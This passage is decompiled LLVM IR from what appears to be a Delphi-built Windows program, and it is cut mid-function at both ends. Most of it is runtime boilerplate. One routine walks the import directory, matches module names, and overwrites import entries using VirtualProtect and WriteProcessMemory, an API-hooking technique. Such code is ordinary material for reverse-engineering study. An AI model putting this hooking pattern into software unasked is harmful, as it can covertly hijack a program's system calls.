  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !978
  br label %dec_label_pc_4059d8, !insn.addr !978

dec_label_pc_4059d8:                              ; preds = %dec_label_pc_405816, %dec_label_pc_4057a8
  %106 = add i32 %esp.0.reload, -16, !insn.addr !979
  %107 = inttoptr i32 %106 to i32*, !insn.addr !979
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !980
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !981
  %109 = add i32 %esp.1.reload, 8, !insn.addr !982
  %110 = inttoptr i32 %109 to i32*, !insn.addr !982
  store i32 4217364, i32* %110, align 4, !insn.addr !982
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !983
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !984
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !985
  ret i32 %113, !insn.addr !986
}

define i32 @function_405a0d() local_unnamed_addr {
dec_label_pc_405a0d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !987
  ret i32 %0, !insn.addr !987
}

define i32 @function_405a12() local_unnamed_addr {
dec_label_pc_405a12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !988
}

define i32 @function_405a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a14:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !989
}

define i32 @function_405adf() local_unnamed_addr {
dec_label_pc_405adf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !990
  %4 = inttoptr i32 %0 to i32*, !insn.addr !990
  store i32 %3, i32* %4, align 4, !insn.addr !990
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !991
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !991
  %9 = add i8 %6, %8, !insn.addr !991
  %10 = inttoptr i32 %7 to i8*, !insn.addr !991
  store i8 %9, i8* %10, align 1, !insn.addr !991
  %11 = add i32 %2, 85, !insn.addr !992
  %12 = inttoptr i32 %11 to i8*, !insn.addr !992
  %13 = load i8, i8* %12, align 1, !insn.addr !992
  %14 = trunc i32 %1 to i8, !insn.addr !992
  %15 = add i8 %13, %14, !insn.addr !992
  store i8 %15, i8* %12, align 1, !insn.addr !992
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !993
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !993
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !993
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !994
  %18 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !995
  %19 = add i32 %18, 1, !insn.addr !995
  %20 = icmp eq i32 %19, 0, !insn.addr !995
  store i32 %19, i32* @global_var_4096b0, align 4, !insn.addr !995
  %21 = icmp eq i1 %20, false, !insn.addr !996
  br i1 %21, label %dec_label_pc_405b19, label %dec_label_pc_405b05, !insn.addr !996

dec_label_pc_405b05:                              ; preds = %dec_label_pc_405adf
  %22 = call i32 @"@LStrClr"(), !insn.addr !997
  %23 = call i32 @"@LStrClr"(), !insn.addr !998
  br label %dec_label_pc_405b19, !insn.addr !998

dec_label_pc_405b19:                              ; preds = %dec_label_pc_405b05, %dec_label_pc_405adf
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !999
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1000
  ret i32 0, !insn.addr !1001
}

define i32 @function_405b27() local_unnamed_addr {
dec_label_pc_405b27:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1002
  ret i32 %0, !insn.addr !1002
}

define i32 @function_405b2c() local_unnamed_addr {
dec_label_pc_405b2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1003
}

define i32 @function_405b2e(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b2e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1004
}

define i32 @function_405b30() local_unnamed_addr {
dec_label_pc_405b30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !1005
  %2 = add i32 %1, -1, !insn.addr !1005
  store i32 %2, i32* @global_var_4096b0, align 4, !insn.addr !1005
  ret i32 %0, !insn.addr !1006
}

define i32* @function_405b38(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_405b38:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1007
  ret i32* %0, !insn.addr !1007
}

define i32 @function_405b40() local_unnamed_addr {
dec_label_pc_405b40:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1008
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1008
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1008
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1009
  %2 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1010
  %3 = add i32 %2, 1, !insn.addr !1010
  store i32 %3, i32* @global_var_4096b8, align 4, !insn.addr !1010
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1011
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1012
  ret i32 0, !insn.addr !1013
}

define i32 @function_405b65() local_unnamed_addr {
dec_label_pc_405b65:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1014
  ret i32 %0, !insn.addr !1014
}

define i32 @function_405b6a() local_unnamed_addr {
dec_label_pc_405b6a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1015
}

define i32 @function_405b6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b6c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1016
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1017
  %2 = add i32 %1, -1, !insn.addr !1017
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !1017
  ret i32 %0, !insn.addr !1018
}

define i32 @function_405bd0(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405bd0:
  %esp.1.reg2mem = alloca i32, !insn.addr !1019
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1019
  %eax.0.reg2mem = alloca i32, !insn.addr !1019
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1020
  %7 = icmp eq i8 %6, 0, !insn.addr !1020
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1021
  br i1 %7, label %dec_label_pc_405be3, label %dec_label_pc_405bdb, !insn.addr !1021

dec_label_pc_405bdb:                              ; preds = %dec_label_pc_405bd0
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1022
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1022
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1022
  br label %dec_label_pc_405be3, !insn.addr !1022

dec_label_pc_405be3:                              ; preds = %dec_label_pc_405bdb, %dec_label_pc_405bd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1023
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1024
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1024
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1024
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1025
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1025
  store i32 %13, i32* %15, align 4, !insn.addr !1025
  %16 = icmp eq i32* %12, null, !insn.addr !1026
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1027
  br i1 %16, label %dec_label_pc_405c3b, label %dec_label_pc_405bff, !insn.addr !1027

dec_label_pc_405bff:                              ; preds = %dec_label_pc_405be3
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1028
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1029
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1029
  store i32 %17, i32* %19, align 4, !insn.addr !1029
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1030
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1031
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1031
  store i32 %20, i32* %22, align 4, !insn.addr !1031
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1032
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1032
  store i32 %arg3, i32* %24, align 4, !insn.addr !1032
  %25 = load i32, i32* %22, align 4, !insn.addr !1033
  %26 = add i32 %esp.0, -8, !insn.addr !1034
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1034
  store i32 %25, i32* %27, align 4, !insn.addr !1034
  %28 = add i32 %esp.0, -12, !insn.addr !1035
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1035
  store i32 %17, i32* %29, align 4, !insn.addr !1035
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1036
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1036
  %32 = add i32 %esp.0, -16, !insn.addr !1037
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1037
  store i32 %31, i32* %33, align 4, !insn.addr !1037
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1038
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1038
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1039
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1039
  store i32 %35, i32* %37, align 4, !insn.addr !1039
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1040
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1041
  br i1 %38, label %dec_label_pc_405c3b, label %dec_label_pc_405c27, !insn.addr !1041

dec_label_pc_405c27:                              ; preds = %dec_label_pc_405bff
  %39 = load i32, i32* %24, align 4, !insn.addr !1042
  %40 = add i32 %esp.0, -20, !insn.addr !1043
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1043
  store i32 %39, i32* %41, align 4, !insn.addr !1043
  %42 = load i32, i32* %15, align 4, !insn.addr !1044
  %43 = add i32 %esp.0, -24, !insn.addr !1045
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1045
  store i32 %42, i32* %44, align 4, !insn.addr !1045
  %45 = call i32 @function_405ca4(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1046
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !1046
  br label %dec_label_pc_405c3b, !insn.addr !1046

dec_label_pc_405c3b:                              ; preds = %dec_label_pc_405c27, %dec_label_pc_405bff, %dec_label_pc_405be3
  br i1 %7, label %dec_label_pc_405c52, label %dec_label_pc_405c43, !insn.addr !1047

dec_label_pc_405c43:                              ; preds = %dec_label_pc_405c3b
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !1048
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1049
  %48 = load i32, i32* %47, align 4, !insn.addr !1049
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !1049
  br label %dec_label_pc_405c52, !insn.addr !1050

dec_label_pc_405c52:                              ; preds = %dec_label_pc_405c43, %dec_label_pc_405c3b
  %49 = add i32 %eax.0.reload, 4, !insn.addr !1051
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1051
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1023
  ret i32 %eax.0.reload, !insn.addr !1052
}

define i32 @function_405c5c() local_unnamed_addr {
dec_label_pc_405c5c:
  %eax.1.reg2mem = alloca i32, !insn.addr !1053
  %eax.0.reg2mem = alloca i32, !insn.addr !1053
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !1054
  %4 = add i32 %3, 8, !insn.addr !1055
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1055
  %6 = load i32, i32* %5, align 4, !insn.addr !1055
  %7 = icmp eq i32 %6, 0, !insn.addr !1055
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1056
  br i1 %7, label %dec_label_pc_405c96, label %dec_label_pc_405c6d, !insn.addr !1056

dec_label_pc_405c6d:                              ; preds = %dec_label_pc_405c5c
  %8 = add i32 %3, 24, !insn.addr !1057
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1057
  %10 = load i32, i32* %9, align 4, !insn.addr !1057
  %11 = icmp eq i32 %10, 0, !insn.addr !1057
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1058
  br i1 %11, label %dec_label_pc_405c96, label %dec_label_pc_405c73, !insn.addr !1058

dec_label_pc_405c73:                              ; preds = %dec_label_pc_405c6d
  %12 = add i32 %3, 4, !insn.addr !1059
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1059
  %14 = load i32, i32* %13, align 4, !insn.addr !1059
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1060
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !1061
  %17 = ptrtoint i32* %16 to i32, !insn.addr !1061
  %18 = load i32, i32* %5, align 4, !insn.addr !1062
  %19 = icmp eq i32 %18, %17, !insn.addr !1062
  %20 = icmp eq i1 %19, false, !insn.addr !1063
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !1063
  br i1 %20, label %dec_label_pc_405c96, label %dec_label_pc_405c81, !insn.addr !1063

dec_label_pc_405c81:                              ; preds = %dec_label_pc_405c73
  %21 = load i32, i32* %9, align 4, !insn.addr !1064
  %22 = call i32 @function_405ca4(i32 %21), !insn.addr !1065
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !1065
  br label %dec_label_pc_405c96, !insn.addr !1065

dec_label_pc_405c96:                              ; preds = %dec_label_pc_405c81, %dec_label_pc_405c73, %dec_label_pc_405c6d, %dec_label_pc_405c5c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !1066
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !1067
  br i1 %24, label %dec_label_pc_405ca1, label %dec_label_pc_405c9a, !insn.addr !1067

dec_label_pc_405c9a:                              ; preds = %dec_label_pc_405c96
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !1068
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !1068
  br label %dec_label_pc_405ca1, !insn.addr !1068

dec_label_pc_405ca1:                              ; preds = %dec_label_pc_405c9a, %dec_label_pc_405c96
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !1069
}

define i32 @function_405ca4(i32 %arg1) local_unnamed_addr {
dec_label_pc_405ca4:
  %eax.0.reg2mem = alloca i32, !insn.addr !1070
  %esp.0.reg2mem = alloca i32, !insn.addr !1070
  %storemerge6.reg2mem = alloca i32, !insn.addr !1070
  %.reg2mem14 = alloca i32, !insn.addr !1070
  %esp.17.reg2mem = alloca i32, !insn.addr !1070
  %esi.08.reg2mem = alloca i32, !insn.addr !1070
  %.reg2mem = alloca i32, !insn.addr !1070
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !1071
  %4 = icmp eq i1 %3, false, !insn.addr !1072
  %5 = icmp eq i32 %arg1, 0, !insn.addr !1073
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_405d51, label %dec_label_pc_405cca, !insn.addr !1072

dec_label_pc_405cca:                              ; preds = %dec_label_pc_405ca4
  %6 = trunc i32 %2 to i16, !insn.addr !1074
  %7 = trunc i32 %1 to i8, !insn.addr !1075
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !1076
  %8 = inttoptr i32 %0 to i32*, !insn.addr !1077
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !1077
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1077
  %11 = icmp eq i32* %9, null, !insn.addr !1078
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1079
  br i1 %11, label %dec_label_pc_405d51, label %dec_label_pc_405d4a.preheader, !insn.addr !1079

dec_label_pc_405d4a.preheader:                    ; preds = %dec_label_pc_405cca
  %12 = add i32 %10, 12, !insn.addr !1080
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1080
  %14 = load i32, i32* %13, align 4, !insn.addr !1080
  %15 = icmp eq i32 %14, 0, !insn.addr !1081
  %16 = icmp eq i1 %15, false, !insn.addr !1082
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !1082
  br i1 %16, label %dec_label_pc_405ce3.lr.ph, label %dec_label_pc_405d51, !insn.addr !1082

dec_label_pc_405ce3.lr.ph:                        ; preds = %dec_label_pc_405d4a.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1076
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !1083
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_405ce3

dec_label_pc_405ce3:                              ; preds = %dec_label_pc_405ce3.lr.ph, %dec_label_pc_405d47
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !1084
  %24 = add i32 %esp.17.reload, -4, !insn.addr !1085
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1085
  store i32 %18, i32* %25, align 4, !insn.addr !1085
  %26 = add i32 %esp.17.reload, -8, !insn.addr !1086
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1086
  store i32 %23, i32* %27, align 4, !insn.addr !1086
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !1087
  %29 = icmp eq i32 %28, 0, !insn.addr !1088
  %30 = icmp eq i1 %29, false, !insn.addr !1089
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1089
  br i1 %30, label %dec_label_pc_405d47, label %dec_label_pc_405cf6, !insn.addr !1089

dec_label_pc_405cf6:                              ; preds = %dec_label_pc_405ce3
  %31 = add i32 %esi.08.reload, 16, !insn.addr !1090
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1090
  %33 = load i32, i32* %32, align 4, !insn.addr !1090
  %34 = add i32 %33, %arg1, !insn.addr !1091
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1092
  %36 = load i32, i32* %35, align 4, !insn.addr !1092
  %37 = icmp eq i32 %36, 0, !insn.addr !1093
  %38 = icmp eq i1 %37, false, !insn.addr !1094
  store i32 %36, i32* %.reg2mem14, !insn.addr !1094
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !1094
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1094
  br i1 %38, label %dec_label_pc_405cfe, label %dec_label_pc_405d47, !insn.addr !1094

dec_label_pc_405cfe:                              ; preds = %dec_label_pc_405cf6, %dec_label_pc_405d3e
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !1095
  %40 = icmp eq i1 %39, false, !insn.addr !1096
  br i1 %40, label %dec_label_pc_405d3e, label %dec_label_pc_405d03, !insn.addr !1096

dec_label_pc_405d03:                              ; preds = %dec_label_pc_405cfe
  %41 = add i32 %esp.17.reload, -12, !insn.addr !1097
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1097
  store i32 %20, i32* %42, align 4, !insn.addr !1097
  %43 = add i32 %esp.17.reload, -16, !insn.addr !1098
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1098
  store i32 128, i32* %44, align 4, !insn.addr !1098
  %45 = add i32 %esp.17.reload, -20, !insn.addr !1099
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1099
  store i32 4, i32* %46, align 4, !insn.addr !1099
  %47 = add i32 %esp.17.reload, -24, !insn.addr !1100
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1100
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !1100
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1101
  %50 = add i32 %esp.17.reload, -28, !insn.addr !1102
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1102
  store i32 %21, i32* %51, align 4, !insn.addr !1102
  %52 = add i32 %esp.17.reload, -32, !insn.addr !1103
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1103
  store i32 4, i32* %53, align 4, !insn.addr !1103
  %54 = add i32 %esp.17.reload, -36, !insn.addr !1104
  %55 = inttoptr i32 %54 to i32*, !insn.addr !1104
  store i32 %22, i32* %55, align 4, !insn.addr !1104
  %56 = add i32 %esp.17.reload, -40, !insn.addr !1105
  %57 = inttoptr i32 %56 to i32*, !insn.addr !1105
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !1105
  %58 = call i32* @GetCurrentProcess(), !insn.addr !1106
  %59 = ptrtoint i32* %58 to i32, !insn.addr !1106
  %60 = add i32 %esp.17.reload, -44, !insn.addr !1107
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1107
  store i32 %59, i32* %61, align 4, !insn.addr !1107
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1108
  %63 = add i32 %esp.17.reload, -48, !insn.addr !1109
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1109
  store i32 %21, i32* %64, align 4, !insn.addr !1109
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !1110
  %66 = add i32 %esp.17.reload, -52, !insn.addr !1111
  %67 = inttoptr i32 %66 to i32*, !insn.addr !1111
  store i32 %65, i32* %67, align 4, !insn.addr !1111
  %68 = add i32 %esp.17.reload, -56, !insn.addr !1112
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1112
  store i32 4, i32* %69, align 4, !insn.addr !1112
  %70 = add i32 %esp.17.reload, -60, !insn.addr !1113
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1113
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !1113
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1114
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !1115
  br label %dec_label_pc_405d47, !insn.addr !1115

dec_label_pc_405d3e:                              ; preds = %dec_label_pc_405cfe
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !1116
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1092
  %75 = load i32, i32* %74, align 4, !insn.addr !1092
  %76 = icmp eq i32 %75, 0, !insn.addr !1093
  %77 = icmp eq i1 %76, false, !insn.addr !1094
  store i32 %75, i32* %.reg2mem14, !insn.addr !1094
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !1094
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1094
  br i1 %77, label %dec_label_pc_405cfe, label %dec_label_pc_405d47, !insn.addr !1094

dec_label_pc_405d47:                              ; preds = %dec_label_pc_405d3e, %dec_label_pc_405cf6, %dec_label_pc_405d03, %dec_label_pc_405ce3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !1117
  %79 = add i32 %esi.08.reload, 32, !insn.addr !1080
  %80 = inttoptr i32 %79 to i32*, !insn.addr !1080
  %81 = load i32, i32* %80, align 4, !insn.addr !1080
  %82 = icmp eq i32 %81, 0, !insn.addr !1081
  %83 = icmp eq i1 %82, false, !insn.addr !1082
  store i32 %81, i32* %.reg2mem, !insn.addr !1082
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !1082
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !1082
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !1082
  br i1 %83, label %dec_label_pc_405ce3, label %dec_label_pc_405d51, !insn.addr !1082

dec_label_pc_405d51:                              ; preds = %dec_label_pc_405d47, %dec_label_pc_405d4a.preheader, %dec_label_pc_405cca, %dec_label_pc_405ca4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1118
}

define i32 @function_405d5c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405d5c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !1119
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1119
  %3 = load i32, i32* %2, align 4, !insn.addr !1119
  ret i32 %3, !insn.addr !1120
}

define i32 @function_405d60() local_unnamed_addr {
dec_label_pc_405d60:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1121
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1121
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1121
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1122
  %2 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1123
  %3 = add i32 %2, 1, !insn.addr !1123
  store i32 %3, i32* @global_var_4096bc, align 4, !insn.addr !1123
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1124
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1125
  ret i32 0, !insn.addr !1126
}

define i32 @function_405d85() local_unnamed_addr {
dec_label_pc_405d85:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1127
  ret i32 %0, !insn.addr !1127
}

define i32 @function_405d8a() local_unnamed_addr {
dec_label_pc_405d8a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1128
}

define i32 @function_405d8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405d8c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1129
}

define i32 @function_405d90() local_unnamed_addr {
dec_label_pc_405d90:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1130
  %2 = add i32 %1, -1, !insn.addr !1130
  store i32 %2, i32* @global_var_4096bc, align 4, !insn.addr !1130
  ret i32 %0, !insn.addr !1131
}

define i32 @function_405d98() local_unnamed_addr {
dec_label_pc_405d98:
  %esp.0.reg2mem = alloca i32, !insn.addr !1132
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1133
  %2 = icmp eq i32 %0, 0, !insn.addr !1134
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1135
  br i1 %2, label %dec_label_pc_405ea2, label %dec_label_pc_405db2, !insn.addr !1135

dec_label_pc_405db2:                              ; preds = %dec_label_pc_405d98
  %3 = call i32 @function_4036c8(), !insn.addr !1136
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1137
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1137
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1137
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1138
  %7 = icmp eq i1 %6, false, !insn.addr !1139
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1140
  br i1 %7, label %dec_label_pc_405ea2, label %dec_label_pc_405dcd, !insn.addr !1140

dec_label_pc_405dcd:                              ; preds = %dec_label_pc_405db2
  %8 = load i8*, i8** %stack_var_-28, align 4
